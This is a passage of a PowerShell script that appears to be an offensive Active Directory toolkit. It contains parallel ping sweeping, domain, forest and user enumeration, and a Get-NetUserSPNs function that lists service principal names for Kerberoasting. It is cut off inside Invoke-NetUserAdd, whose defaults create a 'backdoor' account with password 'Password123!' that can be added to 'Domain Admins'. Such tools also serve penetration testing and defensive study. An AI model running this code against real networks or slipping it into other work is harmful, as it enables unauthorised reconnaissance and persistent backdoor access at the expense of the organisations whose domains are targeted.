    $Responding = $Computers | Invoke-Ping
    
    # Create a list of computers that successfully responded to Test-Connection

.LINK
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/Invoke-Ping.ps1
    https://gallery.technet.microsoft.com/scriptcenter/Invoke-Ping-Test-in-b553242a
#>
 
    [cmdletbinding(DefaultParameterSetName='Ping')]
    param(
        [Parameter( ValueFromPipeline=$true,
                    ValueFromPipelineByPropertyName=$true, 
                    Position=0)]
        [string[]]$ComputerName,
        
        [int]$Timeout = 20,
        
        [int]$Throttle = 100,
 
        [switch]$NoCloseOnTimeout
    )
 
    Begin
    {
        $Quiet = $True
 
        #http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430
        function Invoke-Parallel {
            [cmdletbinding(DefaultParameterSetName='ScriptBlock')]
            Param (   
                [Parameter(Mandatory=$false,position=0,ParameterSetName='ScriptBlock')]
                    [System.Management.Automation.ScriptBlock]$ScriptBlock,
 
                [Parameter(Mandatory=$false,ParameterSetName='ScriptFile')]
                [ValidateScript({test-path $_ -pathtype leaf})]
                    $ScriptFile,
 
                [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
                [Alias('CN','__Server','IPAddress','Server','ComputerName')]    
                    [PSObject]$InputObject,
 
                    [PSObject]$Parameter,
 
                    [switch]$ImportVariables,
 
                    [switch]$ImportModules,
 
                    [int]$Throttle = 20,
 
                    [int]$SleepTimer = 200,
 
                    [int]$RunspaceTimeout = 0,
 
                    [switch]$NoCloseOnTimeout = $false,
 
                    [int]$MaxQueue,
 
                    [switch] $Quiet = $false
            )
    
            Begin {
                
                #No max queue specified?  Estimate one.
                #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
                if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
                {
                    if($RunspaceTimeout -ne 0){ $script:MaxQueue = $Throttle }
                    else{ $script:MaxQueue = $Throttle * 3 }
                }
                else
                {
                    $script:MaxQueue = $MaxQueue
                }
 
                Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue'"
 
                #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
                if ($ImportVariables -or $ImportModules)
                {
                    $StandardUserEnv = [powershell]::Create().addscript({
 
                        #Get modules and snapins in this clean runspace
                        $Modules = Get-Module | Select -ExpandProperty Name
                        $Snapins = Get-PSSnapin | Select -ExpandProperty Name
 
                        #Get variables in this clean runspace
                        #Called last to get vars like $? into session
                        $Variables = Get-Variable | Select -ExpandProperty Name
                
                        #Return a hashtable where we can access each.
                        @{
                            Variables = $Variables
                            Modules = $Modules
                            Snapins = $Snapins
                        }
                    }).invoke()[0]
            
                    if ($ImportVariables) {
                        #Exclude common parameters, bound parameters, and automatic variables
                        Function _temp {[cmdletbinding()] param() }
                        $VariablesToExclude = @( (Get-Command _temp | Select -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                        Write-Verbose "Excluding variables $( ($VariablesToExclude | sort ) -join ", ")"
 
                        # we don't use 'Get-Variable -Exclude', because it uses regexps. 
                        # One of the veriables that we pass is '$?'. 
                        # There could be other variables with such problems.
                        # Scope 2 required if we move to a real module
                        $UserVariables = @( Get-Variable | Where { -not ($VariablesToExclude -contains $_.Name) } ) 
                        Write-Verbose "Found variables to import: $( ($UserVariables | Select -expandproperty Name | Sort ) -join ", " | Out-String).`n"
 
                    }
 
                    if ($ImportModules) 
                    {
                        $UserModules = @( Get-Module | Where {$StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path $_.Path -ErrorAction SilentlyContinue)} | Select -ExpandProperty Path )
                        $UserSnapins = @( Get-PSSnapin | Select -ExpandProperty Name | Where {$StandardUserEnv.Snapins -notcontains $_ } ) 
                    }
                }
 
                #region functions
            
                Function Get-RunspaceData {
                    [cmdletbinding()]
                    param( [switch]$Wait )
 
                    #loop through runspaces
                    #if $wait is specified, keep looping until all complete
                    Do {
 
                        #set more to false for tracking completion
                        $more = $false
 
                        #run through each runspace.           
                        Foreach($runspace in $runspaces) {
                
                            #get the duration - inaccurate
                            $currentdate = Get-Date
                            $runtime = $currentdate - $runspace.startTime
                            $runMin = [math]::Round( $runtime.totalminutes ,2 )
 
                            #set up log object
                            $log = "" | select Date, Action, Runtime, Status, Details
                            $log.Action = "Removing:'$($runspace.object)'"
                            $log.Date = $currentdate
                            $log.Runtime = "$runMin minutes"
 
                            #If runspace completed, end invoke, dispose, recycle, counter++
                            If ($runspace.Runspace.isCompleted) {
                        
                                $script:completedCount++
                    
                                #check if there were errors
                                if($runspace.powershell.Streams.Error.Count -gt 0) {
                            
                                    #set the logging info and move the file to completed
                                    $log.status = "CompletedWithErrors"
                                    Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                    foreach($ErrorRecord in $runspace.powershell.Streams.Error) {
                                        Write-Error -ErrorRecord $ErrorRecord
                                    }
                                }
                                else {
                            
                                    #add logging details and cleanup
                                    $log.status = "Completed"
                                    Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                }
 
                                #everything is logged, clean up the runspace
                                $runspace.powershell.EndInvoke($runspace.Runspace)
                                $runspace.powershell.dispose()
                                $runspace.Runspace = $null
                                $runspace.powershell = $null
 
                            }
 
                            #If runtime exceeds max, dispose the runspace
                            ElseIf ( $runspaceTimeout -ne 0 -and $runtime.totalseconds -gt $runspaceTimeout) {
                        
                                $script:completedCount++
                                $timedOutTasks = $true
                        
                                #add logging details and cleanup
                                $log.status = "TimedOut"
                                Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                Write-Error "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string)"
 
                                #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                                if (!$noCloseOnTimeout) { $runspace.powershell.dispose() }
                                $runspace.Runspace = $null
                                $runspace.powershell = $null
                                $completedCount++
 
                            }
               
                            #If runspace isn't null set more to true  
                            ElseIf ($runspace.Runspace -ne $null ) {
                                $log = $null
                                $more = $true
                            }
                        }
 
                        #Clean out unused runspace jobs
                        $temphash = $runspaces.clone()
                        $temphash | Where { $_.runspace -eq $Null } | ForEach {
                            $Runspaces.remove($_)
                        }
 
                        #sleep for a bit if we will loop again
                        if($PSBoundParameters['Wait']){ Start-Sleep -milliseconds $SleepTimer }
 
                    #Loop again only if -wait parameter and there are more runspaces to process
                    } while ($more -and $PSBoundParameters['Wait'])
            
                #End of runspace function
                }
 
                #endregion functions
        
                #region Init
 
                if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
                {
                    $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | out-string) )
                }
                elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock')
                {
                    #Start building parameter names for the param block
                    [string[]]$ParamsToAdd = '$_'
                    if( $PSBoundParameters.ContainsKey('Parameter') )
                    {
                        $ParamsToAdd += '$Parameter'
                    }
 
                    $UsingVariableData = $Null
            
                    # This code enables $Using support through the AST.
                    # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!
            
                    if($PSVersionTable.PSVersion.Major -gt 2)
                    {
                        #Extract using references
                        $UsingVariables = $ScriptBlock.ast.FindAll({$args[0] -is [System.Management.Automation.Language.UsingExpressionAst]},$True)    
 
                        If ($UsingVariables)
                        {
                            $List = New-Object 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                            ForEach ($Ast in $UsingVariables)
                            {
                                [void]$list.Add($Ast.SubExpression)
                            }
 
                            $UsingVar = $UsingVariables | Group Parent | ForEach {$_.Group | Select -First 1}
    
                            #Extract the name, value, and create replacements for each
                            $UsingVariableData = ForEach ($Var in $UsingVar) {
                                Try
                                {
                                    $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                                    $NewName = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    [pscustomobject]@{
                                        Name = $Var.SubExpression.Extent.Text
                                        Value = $Value.Value
                                        NewName = $NewName
                                        NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    }
                                    $ParamsToAdd += $NewName
                                }
                                Catch
                                {
                                    Write-Error "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                                }
                            }
 
                            $NewParams = $UsingVariableData.NewName -join ', '
                            $Tuple = [Tuple]::Create($list, $NewParams)
                            $bindingFlags = [Reflection.BindingFlags]"Default,NonPublic,Instance"
                            $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))
    
                            $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))
 
                            $ScriptBlock = [scriptblock]::Create($StringScriptBlock)
 
                            Write-Verbose $StringScriptBlock
                        }
                    }
            
                    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ", "))`r`n" + $Scriptblock.ToString())
                }
                else
                {
                    Throw "Must provide ScriptBlock or ScriptFile"; Break
                }
 
                Write-Debug "`$ScriptBlock: $($ScriptBlock | Out-String)"
                Write-Verbose "Creating runspace pool and session states"
 
                #If specified, add variables and modules/snapins to session state
                $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
                if ($ImportVariables)
                {
                    if($UserVariables.count -gt 0)
                    {
                        foreach($Variable in $UserVariables)
                        {
                            $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                        }
                    }
                }
                if ($ImportModules)
                {
                    if($UserModules.count -gt 0)
                    {
                        foreach($ModulePath in $UserModules)
                        {
                            $sessionstate.ImportPSModule($ModulePath)
                        }
                    }
                    if($UserSnapins.count -gt 0)
                    {
                        foreach($PSSnapin in $UserSnapins)
                        {
                            [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                        }
                    }
                }
 
                #Create runspace pool
                $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
                $runspacepool.Open() 
 
                Write-Verbose "Creating empty collection to hold runspace jobs"
                $Script:runspaces = New-Object System.Collections.ArrayList        
    
                #If inputObject is bound get a total count and set bound to true
                $global:__bound = $false
                $allObjects = @()
                if( $PSBoundParameters.ContainsKey("inputObject") ){
                    $global:__bound = $true
                }
 
                #endregion INIT
            }
 
            Process {
                #add piped objects to all objects or set all objects to bound input object parameter
                if( -not $global:__bound ){
                    $allObjects += $inputObject
                }
                else{
                    $allObjects = $InputObject
                }
            }
 
            End {
        
                #Use Try/Finally to catch Ctrl+C and clean up.
                Try
                {
                    #counts for progress
                    $totalCount = $allObjects.count
                    $script:completedCount = 0
                    $startedCount = 0
 
                    foreach($object in $allObjects){
        
                        #region add scripts to runspace pool
                    
                            #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                            $powershell = [powershell]::Create()
                    
                            if ($VerbosePreference -eq 'Continue')
                            {
                                [void]$PowerShell.AddScript({$VerbosePreference = 'Continue'})
                            }
 
                            [void]$PowerShell.AddScript($ScriptBlock).AddArgument($object)
 
                            if ($parameter)
                            {
                                [void]$PowerShell.AddArgument($parameter)
                            }
 
                            # $Using support from Boe Prox
                            if ($UsingVariableData)
                            {
                                Foreach($UsingVariable in $UsingVariableData) {
                                    Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                                    [void]$PowerShell.AddArgument($UsingVariable.Value)
                                }
                            }
 
                            #Add the runspace into the powershell instance
                            $powershell.RunspacePool = $runspacepool
    
                            #Create a temporary collection for each runspace
                            $temp = "" | Select-Object PowerShell, StartTime, object, Runspace
                            $temp.PowerShell = $powershell
                            $temp.StartTime = Get-Date
                            $temp.object = $object
    
                            #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                            $temp.Runspace = $powershell.BeginInvoke()
                            $startedCount++
 
                            #Add the temp tracking info to $runspaces collection
                            Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                            $runspaces.Add($temp) | Out-Null
            
                            #loop through existing runspaces one time
                            Get-RunspaceData
 
                            #If we have more running than max queue (used to control timeout accuracy)
                            #Script scope resolves odd PowerShell 2 issue
                            $firstRun = $true
                            while ($runspaces.count -ge $Script:MaxQueue) {
 
                                #give verbose output
                                if($firstRun){
                                    Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                                }
                                $firstRun = $false
                    
                                #run get-runspace data and sleep for a short while
                                Get-RunspaceData
                                Start-Sleep -Milliseconds $sleepTimer
                            }
                        #endregion add scripts to runspace pool
                    }
                     
                    Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
                    Get-RunspaceData -wait
                }
                Finally
                {
                    #Close the runspace pool, unless we specified no close on timeout and something timed out
                    if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($noCloseOnTimeout -eq $false) ) ) {
                        Write-Verbose "Closing the runspace pool"
                        $runspacepool.close()
                    }
                    #collect garbage
                    [gc]::Collect()
                }       
            }
        }
 
        Write-Verbose "PSBoundParameters = $($PSBoundParameters | Out-String)"
        
        $bound = $PSBoundParameters.keys -contains "ComputerName"
        if(-not $bound)
        {
            [System.Collections.ArrayList]$AllComputers = @()
        }
    }
    Process
    {
        #Handle both pipeline and bound parameter.  We don't want to stream objects, defeats purpose of parallelizing work
        if($bound)
        {
            $AllComputers = $ComputerName
        }
        Else
        {
            foreach($Computer in $ComputerName)
            {
                $AllComputers.add($Computer) | Out-Null
            }
        }
    }
    End
    {
        #Built up the parameters and run everything in parallel
        $params = @()
        $splat = @{
            Throttle = $Throttle
            RunspaceTimeout = $Timeout
            InputObject = $AllComputers
        }
        if($NoCloseOnTimeout)
        {
            $splat.add('NoCloseOnTimeout',$True)
        }
 
        Invoke-Parallel @splat -ScriptBlock {
            $computer = $_.trim()
            Try
            {
                #Pick out a few properties, add a status label.  If quiet output, just return the address
                $result = $null
                if( $result = @( Test-Connection -ComputerName $computer -Count 2 -erroraction Stop ) )
                {
                    $Output = $result | Select -first 1 -Property Address, IPV4Address, IPV6Address, ResponseTime, @{ label = "STATUS"; expression = {"Responding"} }
                    $Output.address
                }
            }
            Catch
            {
            }
        }
    }
}


function Test-Server {
    <#
        .SYNOPSIS
        Tests a connection to a remote server.

        .DESCRIPTION
        This function uses either ping (test-connection) or RPC
        (through WMI) to test connectivity to a remote server.

        .PARAMETER Server
        The hostname/IP to test connectivity to.

        .OUTPUTS
        $True/$False

        .EXAMPLE
        > Test-Server -Server WINDOWS7
        Tests ping connectivity to the WINDOWS7 server.

        .EXAMPLE
        > Test-Server -RPC -Server WINDOWS7
        Tests RPC connectivity to the WINDOWS7 server.

        .LINK
        http://gallery.technet.microsoft.com/scriptcenter/Enhanced-Remote-Server-84c63560
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$true)]
        [String]
        $Server,

        [Switch]
        $RPC
    )

    process {
        if ($RPC){
            $WMIParameters = @{
                            namespace = 'root\cimv2'
                            Class = 'win32_ComputerSystem'
                            ComputerName = $Name
                            ErrorAction = 'Stop'
                          }
            if ($Credential -ne $null)
            {
                $WMIParameters.Credential = $Credential
            }
            try
            {
                Get-WmiObject @WMIParameters
            }
            catch {
                Write-Verbose -Message 'Could not connect via WMI'
            }
        }
        # otherwise, use ping
        else{
            Test-Connection -ComputerName $Server -count 1 -Quiet
        }
    }
}


function Convert-NameToSid {
    <#
    .SYNOPSIS
    Converts a given user/group name to a security identifier (SID).
    
    .PARAMETER Name
    The hostname/IP to test connectivity to.

    .PARAMETER Domain
    Specific domain for the given user account. Otherwise the current domain is used.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $Name,

        [String]
        $Domain
    )
    begin {
        if(-not $Domain){
            $Domain = (Get-NetDomain).Name
        }
    }
    process {
        try {
            $obj = (New-Object System.Security.Principal.NTAccount($Domain,$Name))
            $obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Warning "invalid name"
        }
    }
}


function Convert-SidToName {
    <#
    .SYNOPSIS
    Converst a security identifier (SID) to a group/user name.
    
    .PARAMETER SID
    The SID to convert.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $obj = (New-Object System.Security.Principal.SecurityIdentifier($SID))
            $obj.Translate( [System.Security.Principal.NTAccount]).Value
        }
        catch {
            Write-Warning "invalid SID"
        }
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-NetDomain {
    <#
        .SYNOPSIS
        Returns the name of the current user's domain.

        .PARAMETER Domain
        The domain to query return. If not supplied, the
        current domain is used.

        .EXAMPLE
        > Get-NetDomain
        Return the current domain.

        .LINK
        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain
    )

    if($Domain -and ($Domain -ne "")){
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else{
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}


function Get-NetForest {
    <#
        .SYNOPSIS
        Returns the forest specified, or the current forest
        associated with this domain,

        .PARAMETER Forest
        Return the specified forest.

        .EXAMPLE
        > Get-NetForest
        Return current forest.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Forest
    )

    if($Forest){
        # if a forest is specified, try to grab that forest
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
        try{
            [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch{
            Write-Warning "The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else{
        # otherwise use the current forest
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
}


function Get-NetForestDomains {
    <#
        .SYNOPSIS
        Return all domains for the current forest.

        .PARAMETER Forest
        Return domains for the specified forest.

        .PARAMETER Domain
        Return doamins that match this term/wildcard.

        .EXAMPLE
        > Get-NetForestDomains
        Return domains apart of the current forest.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain,

        [string]
        $Forest
    )

    if($Domain){
        # try to detect a wild card so we use -like
        if($Domain.Contains('*')){
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
        }
        else{
            # match the exact domain name if there's not a wildcard
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
        }
    }
    else{
        # return all domains
        (Get-NetForest -Forest $Forest).Domains
    }
}


function Get-NetDomainControllers {
    <#
        .SYNOPSIS
        Return the current domain controllers for the active domain.

        .PARAMETER Domain
        The domain to query for domain controllers. If not supplied, the
        current domain is used.

        .EXAMPLE
        > Get-NetDomainControllers
        Returns the domain controllers for the current computer's domain.
        Approximately equivialent to the hostname given in the LOGONSERVER
        environment variable.

        .EXAMPLE
        > Get-NetDomainControllers -Domain test
        Returns the domain controllers for the domain "test".
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain
    )

    $d = Get-NetDomain -Domain $Domain
    if($d){
        $d.DomainControllers
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-NetCurrentUser {
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}

function Get-NameField {
    # function that attempts to extract the appropriate field name
    # from various passed objects. This is so functions can have
    # multiple types of objects passed on the pipeline.
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $object
    )
    process {
        if($object){
            if ( [bool]($object.PSobject.Properties.name -match "dnshostname") ) {
                # objects from Get-NetComputers
                $object.dnshostname
            }
            elseif ( [bool]($object.PSobject.Properties.name -match "name") ) {
                # objects from Get-NetDomainControllers
                $object.name
            }
            else {
                # strings and catch alls
                $object
            }
        }
        else{
            return $Null
        }
    }
}


function Get-NetUser {
    <#
        .SYNOPSIS
        Query information for a given user or users in the domain.

        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current
        domain for all users. Another domain can be specified to
        query for users across a trust.
        This is a replacement for "net users /domain"

        .PARAMETER UserName
        Username filter string, wildcards accepted.

        .PARAMETER Domain
        The domain to query for users. If not supplied, the
        current domain is used.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER Filter
        The complete LDAP query string to use to query for users.

        .EXAMPLE
        > Get-NetUser
        Returns the member users of the current domain.

        .EXAMPLE
        > Get-NetUser -Domain testing
        Returns all the members in the "testing" domain.
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $UserName,

        [string]
        $OU,

        [string]
        $Filter,

        [string]
        $Domain
    )
    process {
        # if a domain is specified, try to grab that domain
        if ($Domain){

            # try to grab the primary DC for the current domain
            try{
                $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
            }
            catch{
                $PrimaryDC = $Null
            }

            try {
                # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
                $dn = "DC=$($Domain.Replace('.', ',DC='))"

                # if we have an OU specified, be sure to through it in
                if($OU){
                    $dn = "OU=$OU,$dn"
                }

                # use the specified LDAP query string to query for users
                if($Filter){
                    Write-Verbose "LDAP: $Filter"
                    $dn = $Filter
                }

                # if we could grab the primary DC for the current domain, use that for the query
                if ($PrimaryDC){
                    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
                }
                else{
                    # otherwise try to connect to the DC for the target domain
                    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
                }

                # check if we're using a username filter or not
                if($UserName){
                    # samAccountType=805306368 indicates user objects
                    $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName))"
                }
                else{
                    $UserSearcher.filter='(&(samAccountType=805306368))'
                }
                $UserSearcher.PageSize = 200
                $UserSearcher.FindAll() | ForEach-Object {
                    # for each user/member, do a quick adsi object grab
                    $properties = $_.Properties
                    $out = New-Object psobject
                    $properties.PropertyNames | % {
                        if ($_ -eq "objectsid"){
                            # convert the SID to a string
                            $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                        }
                        elseif($_ -eq "objectguid"){
                            # convert the GUID to a string
                            $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                        }
                        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ){
                            $out | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                        }
                        else {
                            if ($properties[$_].count -eq 1) {
                                $out | Add-Member Noteproperty $_ $properties[$_][0]
                            }
                            else {
                                $out | Add-Member Noteproperty $_ $properties[$_]
                            }
                        }
                    }
                    $out
                }
            }
            catch{
                Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            }
        }
        else{
            # otherwise, use the current domain
            if($UserName){
                $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
            }
            # if we're specifying an OU
            elseif($OU){
                $dn = "OU=$OU," + ([adsi]'').distinguishedname
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
                $UserSearcher.filter='(&(samAccountType=805306368))'
            }
            # if we're specifying a specific LDAP query string
            elseif($Filter){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$Filter")
                $UserSearcher.filter='(&(samAccountType=805306368))'
            }
            else{
                $UserSearcher = [adsisearcher]'(&(samAccountType=805306368))'
            }
            $UserSearcher.PageSize = 200

            $UserSearcher.FindAll() | ForEach-Object {
                # for each user/member, do a quick adsi object grab
                $properties = $_.Properties
                $out = New-Object psobject
                $properties.PropertyNames | % {
                    if ($_ -eq "objectsid"){
                        # convert the SID to a string
                        $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                    }
                    elseif($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ){
                        $out | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                    }
                    else {
                        if ($properties[$_].count -eq 1) {
                            $out | Add-Member Noteproperty $_ $properties[$_][0]
                        }
                        else {
                            $out | Add-Member Noteproperty $_ $properties[$_]
                        }
                    }
                }
                $out
            }
        }
    }
}


function Get-NetUserSPNs {
    <#
        .SYNOPSIS
        Gets all users in the domain with non-null service 
        principal names.

        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current
        domain for all users and find users with non-null
        service principal names (SPNs). Another domain can be
        specified to query for users across a trust.

        .PARAMETER UserName
        Username filter string, wildcards accepted.

        .PARAMETER Domain
        The domain to query for users. If not supplied, the
        current domain is used.

        .EXAMPLE
        > Get-NetUserSPNs
        Returns the member users of the current domain with
        non-null SPNs.

        .EXAMPLE
        > Get-NetUserSPNs -Domain testing
        Returns all the members in the "testing" domain with
        non-null SPNs.
    #>

    [CmdletBinding()]
    param(
        [string]
        $UserName,

        [string]
        $Domain
    )


    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if ($PrimaryDC){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }

            # check if we're using a username filter or not
            if($UserName){
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName))"
            }
            else{
                $UserSearcher.filter='(&(samAccountType=805306368))'
            }
            $UserSearcher.FindAll() | ForEach-Object {
                if ($_.properties['ServicePrincipalName'].count -gt 0){
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'SamAccountName' $_.properties.samaccountname
                    $out | Add-Member Noteproperty 'ServicePrincipalName' $_.properties['ServicePrincipalName']
                    $out
                }
            }
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        if($UserName){
            $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
        }
        else{
            $UserSearcher = [adsisearcher]'(&(samAccountType=805306368))'
        }
        $UserSearcher.FindAll() | ForEach-Object {
            if ($_.properties['ServicePrincipalName'].count -gt 0){
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'samaccountname' $_.properties.samaccountname
                $out | Add-Member Noteproperty 'ServicePrincipalName' $_.properties['ServicePrincipalName']
                $out
            }
        }
    }
}


function Invoke-NetUserAdd {
    <#
        .SYNOPSIS
        Adds a local or domain user.

        .DESCRIPTION
        This function utilizes DirectoryServices.AccountManagement to add a
        user to the local machine or a domain (if permissions allow). It will
        default to adding to the local machine. An optional group name to
        add the user to can be specified.

        .PARAMETER UserName
        The username to add. If not given, it defaults to "backdoor"

        .PARAMETER Password
        The password to set for the added user. If not given, it defaults to "Password123!"

        .PARAMETER GroupName
        Group to optionally add the user to.

        .PARAMETER HostName
        Host to add the local user to, defaults to 'localhost'

        .PARAMETER Domain
        Specified domain to add the user to.

        .EXAMPLE
        > Invoke-NetUserAdd -UserName john -Password password
        Adds a localuser "john" to the machine with password "password"

        .EXAMPLE
        > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain ''
        Adds the user "john" with password "password" to the current domain and adds
        the user to the domain group "Domain Admins"

        .EXAMPLE
        > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain 'testing'
        Adds the user "john" with password "password" to the 'testing' domain and adds
        the user to the domain group "Domain Admins"

        .Link
        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
    #>

    [CmdletBinding()]
    Param (
        [string]
        $UserName = 'backdoor',

        [string]
        $Password = 'Password123!',

        [string]
        $GroupName,

        [string]
        $HostName = 'localhost',

        [string]
        $Domain
    )

    $d = Get-NetDomain -Domain $Domain
    if(-not $d){
        return $null
    }

    if ($Domain){

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/

        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain

        # get the domain context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # create the user object
